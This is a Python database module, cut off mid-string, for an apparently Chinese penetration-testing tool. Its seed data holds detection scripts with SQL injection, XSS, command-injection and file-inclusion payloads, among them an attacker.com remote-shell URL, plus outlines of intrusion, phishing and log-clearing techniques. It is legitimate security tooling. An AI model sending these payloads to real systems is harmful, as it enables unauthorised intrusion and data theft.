"""
数据库管理器
基于20多年渗透测试经验的数据库管理系统
"""

import os
import logging
import sqlite3
from pathlib import Path
from typing import List, Dict, Any, Optional
from sqlalchemy import create_engine, Column, Integer, String, Text, DateTime, JSON
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import sessionmaker, scoped_session
from sqlalchemy.pool import StaticPool
from datetime import datetime
import json

logger = logging.getLogger(__name__)

# SQLAlchemy基础类
Base = declarative_base()

class POC(Base):
    """POC模型"""
    __tablename__ = 'pocs'
    
    id = Column(Integer, primary_key=True)
    poc_id = Column(String(50), unique=True, nullable=False)
    name = Column(String(200), nullable=False)
    description = Column(Text)
    poc_type = Column(String(50))  # web, system, network, mobile
    risk_level = Column(String(20)) # low, medium, high, critical
    exploit_difficulty = Column(String(20)) # easy, medium, hard, expert
    content = Column(Text)         # POC代码内容
    meta_data = Column(JSON)       # 元数据
    tags = Column(JSON)            # 标签
    author = Column(String(100))
    created_date = Column(DateTime, default=datetime.utcnow)
    updated_date = Column(DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)
    
    def to_dict(self) -> Dict[str, Any]:
        """转换为字典"""
        return {
            'id': self.id,
            'poc_id': self.poc_id,
            'name': self.name,
            'description': self.description,
            'poc_type': self.poc_type,
            'risk_level': self.risk_level,
            'exploit_difficulty': self.exploit_difficulty,
            'content': self.content,
            'metadata': self.meta_data or {},
            'tags': self.tags or [],
            'author': self.author,
            'created_date': self.created_date.isoformat() if self.created_date else None,
            'updated_date': self.updated_date.isoformat() if self.updated_date else None
        }

class Vulnerability(Base):
    """漏洞模型"""
    __tablename__ = 'vulnerabilities'
    
    id = Column(Integer, primary_key=True)
    cve_id = Column(String(20), unique=True)
    title = Column(String(300), nullable=False)
    description = Column(Text)
    severity = Column(String(20))  # low, medium, high, critical
    cvss_score = Column(String(10))
    affected_products = Column(JSON)
    references = Column(JSON)
    poc_ids = Column(JSON)         # 关联的POC ID列表
    published_date = Column(DateTime)
    last_modified_date = Column(DateTime)
    
    def to_dict(self) -> Dict[str, Any]:
        """转换为字典"""
        return {
            'id': self.id,
            'cve_id': self.cve_id,
            'title': self.title,
            'description': self.description,
            'severity': self.severity,
            'cvss_score': self.cvss_score,
            'affected_products': self.affected_products or [],
            'references': self.references or [],
            'poc_ids': self.poc_ids or [],
            'published_date': self.published_date.isoformat() if self.published_date else None,
            'last_modified_date': self.last_modified_date.isoformat() if self.last_modified_date else None
        }

class Asset(Base):
    """资产模型"""
    __tablename__ = 'assets'
    
    id = Column(Integer, primary_key=True)
    asset_id = Column(String(50), unique=True, nullable=False)
    name = Column(String(200), nullable=False)
    asset_type = Column(String(50))  # web, api, server, network, mobile, etc.
    target = Column(String(500))  # URL, IP, domain
    description = Column(Text)
    status = Column(String(20), default='active')  # active, inactive, archived
    tags = Column(JSON)
    meta_data = Column(JSON)
    created_at = Column(DateTime, default=datetime.utcnow)
    updated_at = Column(DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)
    
    def to_dict(self) -> Dict[str, Any]:
        """转换为字典"""
        return {
            'id': self.id,
            'asset_id': self.asset_id,
            'name': self.name,
            'asset_type': self.asset_type,
            'target': self.target,
            'description': self.description,
            'status': self.status,
            'tags': self.tags or [],
            'meta_data': self.meta_data or {},
            'created_at': self.created_at.isoformat() if self.created_at else None,
            'updated_at': self.updated_at.isoformat() if self.updated_at else None
        }

class DiscoveredVulnerability(Base):
    """发现的漏洞模型（渗透测试过程中发现的漏洞）"""
    __tablename__ = 'discovered_vulnerabilities'
    
    id = Column(Integer, primary_key=True)
    vuln_id = Column(String(50), unique=True, nullable=False)
    asset_id = Column(String(50))  # 关联的资产ID
    vuln_type = Column(String(50))  # sqli, xss, csrf, rce, etc.
    severity = Column(String(20))  # critical, high, medium, low, info
    title = Column(String(300), nullable=False)
    description = Column(Text)
    evidence = Column(Text)
    status = Column(String(20), default='open')  # open, confirmed, fixed, ignored
    request_id = Column(String(50))
    response_id = Column(String(50))
    created_at = Column(DateTime, default=datetime.utcnow)
    updated_at = Column(DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)
    meta_data = Column(JSON)
    
    def to_dict(self) -> Dict[str, Any]:
        """转换为字典"""
        return {
            'id': self.id,
            'vuln_id': self.vuln_id,
            'asset_id': self.asset_id,
            'vuln_type': self.vuln_type,
            'severity': self.severity,
            'title': self.title,
            'description': self.description,
            'evidence': self.evidence,
            'status': self.status,
            'request_id': self.request_id,
            'response_id': self.response_id,
            'created_at': self.created_at.isoformat() if self.created_at else None,
            'updated_at': self.updated_at.isoformat() if self.updated_at else None,
            'meta_data': self.meta_data or {}
        }

class Document(Base):
    """文档模型"""
    __tablename__ = 'documents'
    
    id = Column(Integer, primary_key=True)
    doc_id = Column(String(50), unique=True, nullable=False)
    title = Column(String(300), nullable=False)
    content = Column(Text)
    doc_type = Column(String(50))  # tutorial, reference, case_study, tool_guide
    category = Column(String(100))
    author = Column(String(100))
    skill_level = Column(String(20)) # beginner, intermediate, advanced, expert
    tags = Column(JSON)
    references = Column(JSON)
    meta_data = Column(JSON)
    created_date = Column(DateTime, default=datetime.utcnow)
    updated_date = Column(DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)
    
    def to_dict(self) -> Dict[str, Any]:
        """转换为字典"""
        return {
            'id': self.id,
            'doc_id': self.doc_id,
            'title': self.title,
            'content': self.content,
            'doc_type': self.doc_type,
            'category': self.category,
            'author': self.author,
            'skill_level': self.skill_level,
            'tags': self.tags or [],
            'references': self.references or [],
            'metadata': self.meta_data or {},
            'created_date': self.created_date.isoformat() if self.created_date else None,
            'updated_date': self.updated_date.isoformat() if self.updated_date else None
        }

class DatabaseManager:
    """数据库管理器"""
    
    def __init__(self, db_path: str = "data/app.db"):
        self.db_path = Path(db_path)
        self.db_path.parent.mkdir(exist_ok=True)
        
        # 数据库连接
        self.engine = None
        self.Session = None
        self.session = None
        
        # 初始化数据库
        self._initialize_database()
    
    def _initialize_database(self):
        """初始化数据库"""
        try:
            # 创建数据库引擎
            db_url = f"sqlite:///{self.db_path}"
            self.engine = create_engine(
                db_url,
                connect_args={"check_same_thread": False},
                poolclass=StaticPool
            )
            
            # 创建会话工厂
            self.Session = scoped_session(sessionmaker(bind=self.engine))
            self.session = self.Session()
            
            # 创建表
            Base.metadata.create_all(self.engine)
            
            # 创建索引
            self._create_indexes()
            
            # 插入初始数据
            self._insert_initial_data()
            
            logger.info(f"数据库初始化完成: {self.db_path}")
            
        except Exception as e:
            logger.error(f"数据库初始化失败: {e}")
            raise
    
    def _create_indexes(self):
        """创建数据库索引"""
        try:
            # 使用SQLAlchemy的DDL创建索引
            from sqlalchemy import Index
            
            indexes = [
                Index('idx_pocs_type', POC.poc_type),
                Index('idx_pocs_risk', POC.risk_level),
                Index('idx_vulns_severity', Vulnerability.severity),
                Index('idx_docs_category', Document.category),
                Index('idx_docs_type', Document.doc_type)
            ]
            
            for index in indexes:
                index.create(bind=self.engine)
            
        except Exception as e:
            logger.warning(f"创建索引失败: {e}")
    
    def _insert_initial_data(self):
        """插入初始数据"""
        try:
            # 检查是否已有数据
            if self.session.query(POC).count() == 0:
                self._insert_sample_pocs()
            
            if self.session.query(Document).count() == 0:
                self._insert_sample_documents()
            
            logger.info("初始数据插入完成")
            
        except Exception as e:
            logger.warning(f"插入初始数据失败: {e}")
    
    def _insert_sample_pocs(self):
        """插入示例POC数据"""
        sample_pocs = [
            {
                'poc_id': 'sqli_time_based',
                'name': 'SQL注入时间盲注检测',
                'description': '基于时间延迟的SQL注入漏洞检测POC，支持MySQL/PostgreSQL/MSSQL',
                'poc_type': 'web',
                'risk_level': 'high',
                'exploit_difficulty': 'medium',
                'content': '''import requests
import time

def check_sql_injection_time_based(url, param_name):
    """
    时间盲注SQL注入检测
    
    Args:
        url: 目标URL
        param_name: 参数名
        
    Returns:
        dict: 检测结果
    """
    payloads = [
        f"{param_name}=1' AND SLEEP(5)-- ",
        f"{param_name}=1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- ",
        f"{param_name}=1' WAITFOR DELAY '0:0:5'-- "
    ]
    
    for payload in payloads:
        start_time = time.time()
        try:
            response = requests.get(url, params={param_name: payload}, timeout=10)
            elapsed_time = time.time() - start_time
            
            if elapsed_time > 4:  # 延迟超过4秒认为存在漏洞
                return {
                    'vulnerable': True, 
                    'evidence': f'时间延迟检测到SQL注入，延迟时间: {elapsed_time:.2f}秒',
                    'payload': payload,
                    'technique': 'Time-based Blind SQL Injection'
                }
        except Exception as e:
            continue
    
    return {'vulnerable': False, 'evidence': '未检测到时间盲注漏洞'}

# 使用示例
if __name__ == "__main__":
    result = check_sql_injection_time_based(
        "http://target.com/search.php", 
        "keyword"
    )
    print(result)
''',
                'author': '昆仑安全实验室',
                'tags': ['sql', 'injection', 'web', 'blind', 'time-based'],
                'requirements': '目标参数存在SQL注入点，支持时间延迟函数',
                'preconditions': '目标网站可访问，参数可正常传递',
                'execution_steps': '1. 设置目标URL和参数名\n2. 执行检测脚本\n3. 分析响应时间',
                'evasion_techniques': '使用编码绕过、大小写混合、注释符变种'
            },
            {
                'poc_id': 'sqli_union_based',
                'name': 'SQL注入联合查询检测',
                'description': '基于联合查询的SQL注入漏洞检测POC，支持数据库指纹识别',
                'poc_type': 'web',
                'risk_level': 'high',
                'exploit_difficulty': 'medium',
                'content': '''import requests
import re

def check_sql_injection_union_based(url, param_name):
    """
    联合查询SQL注入检测
    
    Args:
        url: 目标URL
        param_name: 参数名
        
    Returns:
        dict: 检测结果
    """
    # 数据库指纹识别payload
    db_fingerprints = {
        'mysql': ["1' UNION SELECT 1,2,3-- ", "1' UNION SELECT @@version,2,3-- "],
        'mssql': ["1' UNION SELECT 1,2,3--", "1' UNION SELECT @@version,2,3--"],
        'postgresql': ["1' UNION SELECT 1,2,3--", "1' UNION SELECT version(),2,3--"]
    }
    
    for db_type, payloads in db_fingerprints.items():
        for payload in payloads:
            try:
                response = requests.get(url, params={param_name: payload}, timeout=10)
                
                # 检测数据库特征
                if db_type == 'mysql' and '@@version' in payload:
                    if '5.' in response.text or '8.' in response.text:
                        return {
                            'vulnerable': True,
                            'evidence': f'检测到MySQL数据库联合查询注入',
                            'db_type': 'MySQL',
                            'payload': payload
                        }
                elif db_type == 'mssql' and '@@version' in payload:
                    if 'Microsoft' in response.text:
                        return {
                            'vulnerable': True,
                            'evidence': '检测到MSSQL数据库联合查询注入',
                            'db_type': 'MSSQL',
                            'payload': payload
                        }
                elif db_type == 'postgresql' and 'version()' in payload:
                    if 'PostgreSQL' in response.text:
                        return {
                            'vulnerable': True,
                            'evidence': '检测到PostgreSQL数据库联合查询注入',
                            'db_type': 'PostgreSQL',
                            'payload': payload
                        }
            except Exception as e:
                continue
    
    return {'vulnerable': False, 'evidence': '未检测到联合查询注入漏洞'}

# 使用示例
if __name__ == "__main__":
    result = check_sql_injection_union_based(
        "http://target.com/search.php", 
        "id"
    )
    print(result)
''',
                'author': '昆仑安全实验室',
                'tags': ['sql', 'injection', 'web', 'union', 'database'],
                'requirements': '目标参数存在SQL注入点，支持联合查询',
                'preconditions': '目标网站可访问，参数可正常传递',
                'execution_steps': '1. 设置目标URL和参数名\n2. 执行数据库指纹识别\n3. 验证联合查询注入',
                'evasion_techniques': '使用NULL字节、宽字节、双重编码'
            },
            {
                'poc_id': 'xss_reflected',
                'name': '反射型XSS漏洞检测',
                'description': '反射型跨站脚本漏洞检测POC，支持多种payload和编码方式',
                'poc_type': 'web',
                'risk_level': 'medium',
                'exploit_difficulty': 'easy',
                'content': '''import requests
import re

def check_xss_reflected(url, param_name):
    """
    反射型XSS漏洞检测
    
    Args:
        url: 目标URL
        param_name: 参数名
        
    Returns:
        dict: 检测结果
    """
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "javascript:alert('XSS')",
        "'><script>alert(1)</script>",
        "\" onmouseover=\"alert(1)\""
    ]
    
    for payload in xss_payloads:
        try:
            response = requests.get(url, params={param_name: payload}, timeout=10)
            
            # 检测payload是否在响应中
            if payload in response.text:
                return {
                    'vulnerable': True,
                    'evidence': f'检测到反射型XSS漏洞，payload: {payload}',
                    'payload': payload,
                    'type': 'Reflected XSS'
                }
        except Exception as e:
            continue
    
    return {'vulnerable': False, 'evidence': '未检测到反射型XSS漏洞'}

# 使用示例
if __name__ == "__main__":
    result = check_xss_reflected(
        "http://target.com/search.php", 
        "q"
    )
    print(result)
''',
                'author': '昆仑安全实验室',
                'tags': ['xss', 'web', 'client-side', 'reflected'],
                'requirements': '目标参数未对用户输入进行充分过滤',
                'preconditions': '目标网站可访问，参数可正常传递',
                'execution_steps': '1. 设置目标URL和参数名\n2. 发送XSS payload\n3. 检测响应内容',
                'evasion_techniques': '使用编码绕过、事件处理程序、DOM操作'
            },
            {
                'poc_id': 'xss_stored',
                'name': '存储型XSS漏洞检测',
                'description': '存储型跨站脚本漏洞检测POC，支持持久化payload检测',
                'poc_type': 'web',
                'risk_level': 'high',
                'exploit_difficulty': 'medium',
                'content': '''import requests
import time

def check_xss_stored(url, form_data):
    """
    存储型XSS漏洞检测
    
    Args:
        url: 目标URL（提交表单的地址）
        form_data: 表单数据字典
        
    Returns:
        dict: 检测结果
    """
    xss_payloads = [
        "<script>alert('Stored XSS')</script>",
        "<img src=x onerror=alert('Stored')>",
        "<svg onload=alert('Stored')>"
    ]
    
    for payload in xss_payloads:
        try:
            # 提交payload
            response = requests.post(url, data=form_data, timeout=10)
            
            # 等待数据存储
            time.sleep(2)
            
            # 访问可能显示用户输入的页面
            display_url = "http://target.com/comments.php"  # 示例显示页面
            display_response = requests.get(display_url, timeout=10)
            
            if payload in display_response.text:
                return {
                    'vulnerable': True,
                    'evidence': f'检测到存储型XSS漏洞，payload: {payload}',
                    'payload': payload,
                    'type': 'Stored XSS'
                }
        except Exception as e:
            continue
    
    return {'vulnerable': False, 'evidence': '未检测到存储型XSS漏洞'}

# 使用示例
if __name__ == "__main__":
    form_data = {
        'comment': '<script>alert("XSS")</script>',
        'user_id': '123'
    }
    result = check_xss_stored(
        "http://target.com/submit_comment.php", 
        form_data
    )
    print(result)
''',
                'author': '昆仑安全实验室',
                'tags': ['xss', 'web', 'client-side', 'stored', 'persistent'],
                'requirements': '目标应用存储用户输入并在其他页面显示',
                'preconditions': '目标网站可访问，有用户输入提交功能',
                'execution_steps': '1. 识别用户输入点\n2. 提交存储型payload\n3. 访问显示页面验证',
                'evasion_techniques': '使用事件处理程序、CSS表达式、数据URI'
            },
            {
                'poc_id': 'command_injection',
                'name': '命令注入漏洞检测',
                'description': '操作系统命令注入漏洞检测POC，支持多种系统命令执行检测',
                'poc_type': 'web',
                'risk_level': 'critical',
                'exploit_difficulty': 'medium',
                'content': '''import requests
import time

def check_command_injection(url, param_name):
    """
    命令注入漏洞检测
    
    Args:
        url: 目标URL
        param_name: 参数名
        
    Returns:
        dict: 检测结果
    """
    # 基于时间的命令注入检测
    time_based_payloads = [
        "127.0.0.1; sleep 5",
        "127.0.0.1 | sleep 5",
        "127.0.0.1 && sleep 5",
        "127.0.0.1 || sleep 5"
    ]
    
    for payload in time_based_payloads:
        start_time = time.time()
        try:
            response = requests.get(url, params={param_name: payload}, timeout=10)
            elapsed_time = time.time() - start_time
            
            if elapsed_time > 4:
                return {
                    'vulnerable': True,
                    'evidence': f'检测到命令注入漏洞，延迟时间: {elapsed_time:.2f}秒',
                    'payload': payload,
                    'type': 'Time-based Command Injection'
                }
        except Exception as e:
            continue
    
    # 基于输出的命令注入检测
    output_payloads = [
        "127.0.0.1; whoami",
        "127.0.0.1 | id",
        "127.0.0.1 && pwd"
    ]
    
    for payload in output_payloads:
        try:
            response = requests.get(url, params={param_name: payload}, timeout=10)
            
            # 检测常见命令输出
            if 'root' in response.text or 'uid=' in response.text or '/home' in response.text:
                return {
                    'vulnerable': True,
                    'evidence': f'检测到命令注入漏洞，payload: {payload}',
                    'payload': payload,
                    'type': 'Output-based Command Injection'
                }
        except Exception as e:
            continue
    
    return {'vulnerable': False, 'evidence': '未检测到命令注入漏洞'}

# 使用示例
if __name__ == "__main__":
    result = check_command_injection(
        "http://target.com/ping.php", 
        "ip"
    )
    print(result)
''',
                'author': '昆仑安全实验室',
                'tags': ['command', 'injection', 'os', 'system', 'critical'],
                'requirements': '目标应用执行系统命令且未充分过滤用户输入',
                'preconditions': '目标网站可访问，有命令执行功能',
                'execution_steps': '1. 识别命令执行点\n2. 发送时间延迟payload\n3. 发送命令输出payload',
                'evasion_techniques': '使用反引号、环境变量、命令串联'
            },
            {
                'poc_id': 'file_inclusion',
                'name': '文件包含漏洞检测',
                'description': '本地/远程文件包含漏洞检测POC，支持路径遍历检测',
                'poc_type': 'web',
                'risk_level': 'high',
                'exploit_difficulty': 'medium',
                'content': '''import requests

def check_file_inclusion(url, param_name):
    """
    文件包含漏洞检测
    
    Args:
        url: 目标URL
        param_name: 参数名
        
    Returns:
        dict: 检测结果
    """
    # 本地文件包含检测
    lfi_payloads = [
        "../../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..%2f..%2f..%2f..%2fetc%2fpasswd"
    ]
    
    for payload in lfi_payloads:
        try:
            response = requests.get(url, params={param_name: payload}, timeout=10)
            
            # 检测/etc/passwd文件特征
            if 'root:' in response.text and 'bin/' in response.text:
                return {
                    'vulnerable': True,
                    'evidence': f'检测到本地文件包含漏洞，payload: {payload}',
                    'payload': payload,
                    'type': 'Local File Inclusion (LFI)'
                }
        except Exception as e:
            continue
    
    # 远程文件包含检测
    rfi_payloads = [
        "http://attacker.com/shell.txt",
        "ftp://attacker.com/shell.txt",
        "file:///etc/passwd"
    ]
    
    for payload in rfi_payloads:
        try:
            response = requests.get(url, params={param_name: payload}, timeout=10)
            
            # 检测远程文件包含特征
            if 'http://' in payload or 'ftp://' in payload:
                # 这里需要实际验证远程文件是否被包含
                # 通常需要配合外部服务器进行验证
                pass
        except Exception as e:
            continue
    
    return {'vulnerable': False, 'evidence': '未检测到文件包含漏洞'}

# 使用示例
if __name__ == "__main__":
    result = check_file_inclusion(
        "http://target.com/include.php", 
        "file"
    )
    print(result)
''',
                'author': '昆仑安全实验室',
                'tags': ['file', 'inclusion', 'lfi', 'rfi', 'path'],
                'requirements': '目标应用动态包含文件且未验证文件路径',
                'preconditions': '目标网站可访问，有文件包含功能',
                'execution_steps': '1. 识别文件包含点\n2. 发送路径遍历payload\n3. 验证文件内容',
                'evasion_techniques': '使用空字节、双重编码、协议包装'
            }
        ]
        
        for poc_data in sample_pocs:
            poc = POC(**poc_data)
            self.session.add(poc)
        
        self.session.commit()
    
    def _insert_sample_documents(self):
        """插入示例文档数据"""
        sample_docs = [
            {
                'doc_id': 'penetration_testing_framework',
                'title': '渗透测试方法论与框架',
                'content': '''# 渗透测试方法论与框架

## 1. 渗透测试生命周期

### 1.1 信息收集阶段
- **被动信息收集**: WHOIS查询、DNS枚举、搜索引擎挖掘
- **主动信息收集**: 端口扫描、服务识别、网络拓扑探测
- **社会工程学**: 人员信息收集、组织架构分析

### 1.2 漏洞分析阶段
- **自动化扫描**: 使用Nessus、OpenVAS等工具进行漏洞扫描
- **手动验证**: 对扫描结果进行人工验证和深度分析
- **漏洞利用评估**: 评估漏洞的可利用性和影响范围

### 1.3 漏洞利用阶段
- **权限提升**: 从低权限到高权限的横向和纵向移动
- **持久化访问**: 建立后门、创建持久化机制
- **数据窃取**: 敏感信息收集和提取

### 1.4 后渗透阶段
- **内网横向移动**: 域渗透、网络分段突破
- **权限维持**: 多维度持久化技术
- **痕迹清理**: 日志清除、操作痕迹消除

## 2. 主流渗透测试框架

### 2.1 PTES (Penetration Testing Execution Standard)
- **预交互阶段**: 目标确认、范围界定、规则制定
- **情报收集**: 全面信息收集和分析
- **威胁建模**: 基于威胁情报的攻击路径规划
- **漏洞分析**: 系统性漏洞识别和验证
- **漏洞利用**: 可控的漏洞利用过程
- **后渗透利用**: 深度利用和权限维持
- **报告阶段**: 专业报告编写和成果交付

### 2.2 OWASP Testing Guide
- **信息收集**: Web应用相关信息收集
- **配置管理测试**: 安全配置验证
- **身份认证测试**: 认证机制安全性评估
- **授权测试**: 权限控制机制验证
- **会话管理测试**: 会话安全性评估
- **输入验证测试**: 输入过滤机制验证
- **错误处理测试**: 错误信息泄露检测
- **加密测试**: 加密算法安全性评估
- **业务逻辑测试**: 业务功能安全性验证
- **客户端测试**: 客户端安全机制评估

## 3. 实战渗透测试流程

### 3.1 黑盒测试
- **完全外部视角**: 模拟真实攻击者视角
- **无内部信息**: 仅基于公开信息进行测试
- **真实攻击模拟**: 最大限度模拟真实攻击场景

### 3.2 白盒测试
- **完全内部视角**: 拥有完整系统信息
- **代码审计**: 源代码安全性分析
- **架构分析**: 系统架构安全性评估

### 3.3 灰盒测试
- **混合视角**: 部分内部信息+外部攻击
- **效率与深度平衡**: 兼顾测试效率和深度
- **实战价值高**: 最接近真实攻击场景

## 4. 专业渗透测试工具链

### 4.1 信息收集工具
- **Nmap**: 网络发现和安全审计
- **Recon-ng**: 基于Python的侦察框架
- **theHarvester**: 电子邮件、子域名等信息收集

### 4.2 漏洞扫描工具
- **Nessus**: 综合性漏洞扫描器
- **OpenVAS**: 开源漏洞评估系统
- **Nikto**: Web应用漏洞扫描器

### 4.3 漏洞利用工具
- **Metasploit**: 渗透测试框架
- **Burp Suite**: Web应用安全测试平台
- **SQLMap**: 自动化SQL注入工具

## 5. 渗透测试报告编写

### 5.1 报告结构
- **执行摘要**: 关键发现和风险概述
- **技术细节**: 详细的技术分析和利用过程
- **风险评估**: 漏洞影响和风险等级评估
- **修复建议**: 具体可行的修复方案
- **附录**: 测试过程记录和证据材料

### 5.2 专业报告要素
- **可操作性**: 修复建议必须具体可行
- **可验证性**: 所有发现必须可验证
- **可理解性**: 技术内容必须易于理解
- **完整性**: 覆盖所有测试发现和过程

## 6. 法律与道德规范

### 6.1 法律合规性
- **授权测试**: 必须获得明确授权
- **范围限制**: 严格控制在授权范围内
- **数据保护**: 敏感信息保护和处理

### 6.2 道德规范
- **最小影响原则**: 尽量减少对业务的影响
- **保密原则**: 测试过程和结果严格保密
- **责任原则**: 对测试行为承担相应责任

---

*本文档由昆仑安全实验室基于20年渗透测试实战经验编写*''',
                'doc_type': 'framework',
                'category': '方法论',
                'author': '昆仑安全实验室',
                'skill_level': 'advanced',
                'tags': ['方法论', '框架', '生命周期', '工具链', '报告']
            },
            {
                'doc_id': 'web_security_advanced',
                'title': 'Web应用安全高级技术',
                'content': '''# Web应用安全高级技术

## 1. SQL注入高级技巧

### 1.1 盲注技术
- **布尔盲注**: 基于真假的响应差异判断
- **时间盲注**: 基于时间延迟的信息提取
- **报错盲注**: 基于错误信息的数据库信息获取

### 1.2 绕过技术
- **编码绕过**: URL编码、Base64编码、十六进制编码
- **注释符绕过**: 使用不同注释符变种
- **关键字绕过**: 大小写混合、双重编码、注释分割

### 1.3 高级利用技术
- **堆叠查询**: 执行多条SQL语句
- **带外数据提取**: 通过DNS、HTTP等协议外传数据
- **文件读写**: 利用数据库文件读写功能

## 2. XSS漏洞深度利用

### 2.1 高级payload构造
- **DOM型XSS**: 基于DOM操作的XSS利用
- **mXSS**: 突变XSS，利用浏览器解析差异
- **持久化XSS**: 长期有效的XSS攻击

### 2.2 绕过技术
- **事件处理程序绕过**: 使用不同的事件处理程序
- **编码绕过**: HTML实体编码、JavaScript编码
- **协议处理绕过**: 利用data:、javascript:等协议

### 2.3 实战利用场景
- **会话劫持**: 窃取用户会话信息
- **键盘记录**: 记录用户输入信息
- **钓鱼攻击**: 伪造登录页面窃取凭证

## 3. 文件上传漏洞利用

### 3.1 绕过文件类型检测
- **MIME类型绕过**: 修改Content-Type头
- **文件头绕过**: 添加合法文件头
- **扩展名绕过**: 使用特殊扩展名或双重扩展名

### 3.2 高级利用技术
- **图片马**: 在图片中嵌入恶意代码
- **压缩包利用**: 利用压缩包解压特性
- **解析漏洞**: 利用服务器解析特性

### 3.3 后门维持
- **Webshell管理**: 多种Webshell类型和使用
- **权限维持**: 建立持久化访问通道
- **痕迹清理**: 清除攻击痕迹

## 4. 业务逻辑漏洞

### 4.1 常见业务逻辑漏洞
- **越权访问**: 水平越权、垂直越权
- **业务流程绕过**: 跳过关键验证步骤
- **竞争条件**: 利用时间差进行攻击

### 4.2 高级利用技术
- **参数污染**: HTTP参数污染攻击
- **业务规则绕过**: 利用业务规则漏洞
- **支付漏洞**: 支付流程安全性问题

## 5. API安全测试

### 5.1 API漏洞类型
- **认证绕过**: API认证机制绕过
- **数据泄露**: 敏感信息通过API泄露
- **权限提升**: 通过API进行权限提升

### 5.2 测试方法
- **接口枚举**: 发现隐藏接口和功能
- **参数fuzzing**: 参数模糊测试
- **流量分析**: API流量安全性分析

## 6. 最新Web安全威胁

### 6.1 新型攻击技术
- **GraphQL注入**: GraphQL查询语言安全
- **JWT安全**: JSON Web Token安全性
- **微服务安全**: 微服务架构安全性

### 6.2 防御技术演进
- **WAF绕过技术**: 现代WAF防护绕过
- **云安全挑战**: 云环境下的安全测试
- **容器安全**: 容器化应用安全性

---

*本文档由昆仑安全实验室基于最新Web安全研究成果编写*''',
                'doc_type': 'reference',
                'category': 'Web安全',
                'author': '昆仑安全实验室',
                'skill_level': 'expert',
                'tags': ['web安全', '高级技术', '绕过', '利用', 'API安全']
            },
            {
                'doc_id': 'network_penetration_advanced',
                'title': '网络渗透高级技术',
                'content': '''# 网络渗透高级技术

## 1. 内网渗透技术

### 1.1 网络发现与枚举
- **ARP扫描**: 局域网主机发现
- **NetBIOS枚举**: Windows网络信息收集
- **SNMP扫描**: 网络设备信息收集

### 1.2 横向移动技术
- **Pass the Hash**: 哈希传递攻击
- **Pass the Ticket**: 票据传递攻击
- **Golden Ticket**: 黄金票据攻击

### 1.3 权限维持技术
- **后门植入**: 多种后门技术
- **权限维持**: 持久化访问机制
- **痕迹清理**: 攻击痕迹清除

## 2. 域渗透技术

### 2.1 域信息收集
- **LDAP查询**: 活动目录信息收集
- **SPN扫描**: 服务主体名称枚举
- **BloodHound**: 域关系可视化分析

### 2.2 域权限提升
- **Kerberoasting**: Kerberos票据攻击
- **AS-REP Roasting**: AS-REP哈希攻击
- **DCSync攻击**: 域控制器同步攻击

### 2.3 域持久化
- **Skeleton Key**: 万能密钥攻击
- **DCShadow**: 域控制器影子攻击
- **ACL滥用**: 访问控制列表滥用

## 3. 无线网络渗透

### 3.1 无线网络攻击
- **WPA/WPA2破解**: 握手包捕获和破解
- **Evil Twin**: 恶意接入点攻击
- **KARMA攻击**: 主动探测攻击

### 3.2 高级无线攻击
- **WPS漏洞利用**: Wi-Fi保护设置漏洞
- **企业无线攻击**: 802.1X认证绕过
- **蓝牙安全**: 蓝牙协议安全性

## 4. 网络设备安全

### 4.1 路由器安全
- **默认凭证利用**: 路由器默认密码
- **固件分析**: 路由器固件安全性
- **配置漏洞**: 路由器配置问题

### 4.2 交换机安全
- **VLAN跳跃**: 虚拟局域网绕过
- **ARP欺骗**: 地址解析协议攻击
- **STP攻击**: 生成树协议攻击

## 5. 云环境渗透

### 5.1 云服务安全
- **IAM权限滥用**: 身份和访问管理问题
- **存储桶安全**: 对象存储安全性
- **实例元数据**: 云实例元数据利用

### 5.2 容器安全
- **容器逃逸**: 容器环境突破
- **镜像安全**: 容器镜像安全性
- **编排安全**: 容器编排安全性

## 6. 移动应用渗透

### 6.1 Android应用安全
- **APK反编译**: Android应用逆向
- **组件安全**: Android组件安全性
- **权限滥用**: 应用权限问题

### 6.2 iOS应用安全
- **IPA分析**: iOS应用包分析
- **越狱检测绕过**: 越狱环境检测绕过
- **运行时保护**: iOS运行时安全性

---

*本文档由昆仑安全实验室基于20年网络渗透实战经验编写*''',
                'doc_type': 'reference',
                'category': '网络安全',
                'author': '昆仑安全实验室',
                'skill_level': 'expert',
                'tags': ['网络渗透', '内网', '域安全', '无线', '云安全']
            },
            {
                'doc_id': 'social_engineering_advanced',
                'title': '社会工程学高级技术',
                'content': '''# 社会工程学高级技术

## 1. 信息收集技术

### 1.1 开源情报收集
- **社交媒体分析**: Facebook、Twitter、LinkedIn等
- **专业平台挖掘**: GitHub、Stack Overflow等技术平台
- **公开数据聚合**: 政府公开数据、企业注册信息

### 1.2 人员信息分析
- **组织架构重建**: 基于公开信息重建组织架构
- **关键人员识别**: 识别组织中的关键决策者
- **社交关系映射**: 建立人员社交关系网络

## 2. 心理操控技术

### 2.1 权威性原则
- **权威伪装**: 冒充权威人物或机构
- **专业形象**: 建立专业可信的形象
- **社会证明**: 利用从众心理和社会认同

### 2.2 稀缺性原则
- **时间压力**: 制造时间紧迫感
- **机会稀缺**: 强调机会的唯一性
- **损失厌恶**: 利用人们对损失的恐惧

### 2.3 互惠性原则
- **小恩小惠**: 先给予小恩惠再提出要求
- **情感投资**: 建立情感联系和信任
- **承诺一致**: 利用人们保持承诺一致的心理

## 3. 钓鱼攻击技术

### 3.1 高级钓鱼技术
- **鱼叉式钓鱼**: 针对特定目标的精准钓鱼
- **鲸钓攻击**: 针对高价值目标的钓鱼
- **水坑攻击**: 在目标常访问的网站设置陷阱

### 3.2 邮件伪造技术
- **SPF/DKIM/DMARC绕过**: 邮件认证机制绕过
- **发件人伪装**: 伪造发件人地址和身份
- **内容定制**: 高度定制化的钓鱼内容

### 3.3 电话社会工程
- **语音伪装**: 使用语音变声和伪装技术
- **呼叫转移**: 利用电话系统特性
- **紧急情况模拟**: 模拟紧急情况获取信息

## 4. 物理安全突破

### 4.1 场所进入技术
- **尾随进入**: 跟随授权人员进入限制区域
- **凭证伪造**: 伪造访问凭证和身份证明
- **社交工程**: 通过社交手段获得进入权限

### 4.2 设备物理访问
- **USB设备攻击**: 恶意USB设备植入
